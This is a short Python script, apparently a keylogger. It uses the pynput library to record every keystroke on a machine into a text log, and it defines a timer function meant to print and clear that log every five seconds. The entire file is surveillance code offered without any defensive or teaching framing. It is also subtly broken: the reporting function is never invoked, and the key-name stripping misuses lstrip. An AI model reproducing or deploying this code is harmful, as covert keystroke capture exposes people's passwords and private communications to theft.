#!/usr/bin/env python
import pynput.keyboard
import threading

log = ''

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        to_log = ''
        key_str = str(key)
        if key_str == 'Key.space':
            log = log + " "
        elif key_str == 'Key.enter':
            log = log + '\n'
        elif key_str == 'Key.backspace' or key_str == 'Key.shift':
            pass
        else:
            log = log + "\'" + str(key).lstrip('Key.') + '\' '

def report():
    global log
    print(log)
    log = ''
    timer = threading.Timer(5, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)

with keyboard_listener:
    keyboard_listener.join()
